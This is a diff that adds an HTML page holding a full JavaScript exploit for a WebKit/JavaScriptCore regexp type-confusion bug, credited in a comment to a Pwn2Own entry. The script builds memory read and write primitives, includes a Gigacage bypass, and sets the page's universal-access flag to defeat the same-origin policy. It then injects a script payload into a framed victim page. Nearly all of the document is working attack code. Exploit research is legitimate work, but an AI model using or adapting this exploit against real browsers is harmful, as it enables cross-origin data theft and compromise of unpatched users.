@@ -1,0 +1,240 @@
+<iframe id="victim"></iframe>
+
+<script>
+
+// Victim page has to be frameable
+VICTIM = 'http://10.13.37.2:9000/XXXXXXX';
+PAYLOAD = 'alert(document.domain)';
+WAIT = 5000;
+
+victim = document.getElementById('victim');
+victim.src = VICTIM;
+print = alert;
+
+var structure_spray = []
+for (var i = 0; i < 1000; ++i) {
+    var ary = [13.37];
+    ary.prop = 13.37;
+    ary['p'+i] = 13.37;
+    structure_spray.push(ary);
+}
+
+var unboxed_size = 100;
+
+var convert = new ArrayBuffer(0x10);
+var u32 = new Uint32Array(convert);
+var u8 = new Uint8Array(convert);
+var f64 = new Float64Array(convert);
+var BASE = 0x100000000;
+
+
+function i2f(i) {
+    u32[0] = i%BASE;
+    u32[1] = i/BASE;
+    return f64[0];
+}
+
+function f2i(f) {
+    f64[0] = f;
+    return u32[0] + BASE*u32[1];
+}
+
+function unbox_double(d) {
+    f64[0] = d;
+    u8[6] -= 1;
+    return f64[0];
+}
+function hex(x) {
+    if (x < 0)
+        return `-${hex(-x)}`;
+    return `0x${x.toString(16)}`;
+}
+
+function fail(msg) {
+    print('FAIL: ' + msg);
+    throw null;
+}
+
+// Trigger for Pwn2Own bug by @fluoroacetate (Richard Zhu & Amat Cama)
+// https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2
+function rz_addrof(obj) {
+    var foo = eval(`(arr, regexp, str)=> {
+        regexp[Symbol.match](str);
+        return arr[0];
+    }`);
+    let arr = [1.1, 2.2, 3.3];
+    let regexp = /a/y;
+    for (let i = 0; i < 10000; i++)
+        foo(arr, regexp, "abcd");
+    regexp.lastIndex = {
+        valueOf: () => {
+            arr[0] = obj;
+            return 0;
+        }
+    };
+    return foo(arr, regexp, "abcd");
+}
+
+function rz_fakeobj(addr) {
+    var foo = eval(`(arr, regexp, str)=> {
+        regexp[Symbol.match](str);
+        arr[0] = addr;
+    }`);
+    let arr = [1.1, 2.2, 3.3];
+    let regexp = /a/y;
+    for (let i = 0; i < 10000; i++)
+        foo(arr, regexp, "abcd");
+    regexp.lastIndex = {
+        valueOf: () => {
+            arr[0] = {};
+            return 0;
+        }
+    };
+    foo(arr, regexp, "abcd");
+    return arr[0];
+}
+
+
+function pwn() {
+    var spray = [];
+    for (var i = 0; i < 800; ++i)
+        spray.push(new ArrayBuffer(1024*1024));
+
+    var stage1 = {
+        // returns the address of object victim
+        addrof: function(o) {
+            return f2i(rz_addrof(o));
+        },
+
+        // materializes a javascript object at address addr
+        fakeobj: function(addr) {
+            return rz_fakeobj(i2f(addr));
+        },
+
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            if (x.a != 0x1337) {
+                fail('stage1 addrof/fakeobj does not work');
+            }
+        },
+    };
+
+    //stage1.test();
+    //print('all good (1)');
+
+    var victim = structure_spray[510];
+
+    // Gigacage bypass: Forge a JSObject which has its butterfly pointing
+    // to victim
+    u32[0] = 0x200;
+    u32[1] = 0x01082007 - 0x10000;
+    var flags_double = f64[0];
+
+    u32[1] = 0x01082009 - 0x10000;
+    var flags_contiguous = f64[0];
+
+    var array_spray = [];
+    for (var i = 0; i < 1000; ++i) {
+        array_spray[i] = [13.37+i, 13.37];
+    }
+    var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
+    unboxed[0] = 4.2; // no CopyOnWrite
+
+    var boxed = [{}];
+    //print(`unboxed @ ${hex(stage1.addrof(unboxed))}`);
+    //print(`boxed @ ${hex(stage1.addrof(boxed))}`);
+
+    var outer = {
+        header: flags_contiguous, // cell
+        butterfly: victim, // butterfly
+    };
+    //print(`outer @ ${hex(stage1.addrof(outer))}`);
+
+    var hax = stage1.fakeobj(stage1.addrof(outer) + 0x10);
+
+    hax[1] = unboxed;
+    var shared_butterfly = f2i(victim[1]);
+    //print(`shared butterfly @ ${hex(shared_butterfly)}`);
+    hax[1] = boxed;
+    victim[1] = i2f(shared_butterfly);
+
+    outer.header = flags_double;
+
+    var stage2 = {
+        addrof: function(victim) {
+            boxed[0] = victim;
+            return f2i(unboxed[0]);
+        },
+
+        fakeobj: function(addr) {
+            unboxed[0] = i2f(addr);
+            return boxed[0];
+        },
+
+        write64: function(where, what) {
+            hax[1] = i2f(where + 0x10);
+            victim.prop = this.fakeobj(what);
+        },
+
+        read64: function(where) {
+            hax[1] = i2f(where + 0x10);
+            return this.addrof(victim.prop);
+        },
+
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            if (x.a != 0x1337) {
+                fail('stage2 addrof/fakeobj does not work');
+            }
+
+            var val = 0x42424242;
+            this.write64(shared_butterfly + 8, 0x42424242);
+            if (i2f(val) != unboxed[1]) {
+                fail('stage2 write does not work');
+            }
+
+            if (this.read64(shared_butterfly + 8) != 0x42424242) {
+                fail('stage2 read does not work');
+            }
+        },
+
+        clear: function() {
+            outer = null;
+            hax = null;
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed[i] = null;
+            boxed = null
+            unboxed = null
+        },
+    };
+
+    stage2.test();
+
+
+    var jsxhr = new XMLHttpRequest();
+    var jsxhrAddr = stage2.addrof(jsxhr);
+    var xhrAddr = stage2.read64(jsxhrAddr + 0x18);
+    var scriptExecContextAddr = stage2.read64(xhrAddr + 0x68);
+    var securityOriginPolicyAddr = stage2.read64(scriptExecContextAddr + 8);
+    var securityOriginAddr = stage2.read64(securityOriginPolicyAddr + 8);
+
+    // m_universalAccess flag is at +0x31, set it to 1
+    var flags = stage2.read64(securityOriginAddr + 0x30);
+    stage2.write64(securityOriginAddr + 0x30, flags + 0x0100);
+
+    // try to survive GC (does not work for now because read64 has been compiled
+    // and holds references to corrupted objects)
+    stage2.clear();
+    stage2 = null;
+
+    // Easy XSS now :)
+    var doc = document.getElementById('victim').contentWindow.document;
+    var script = doc.createElement('script');
+    script.innerText = PAYLOAD;
+    doc.head.appendChild(script);
+}
+
+setTimeout(pwn, WAIT);
+</script>
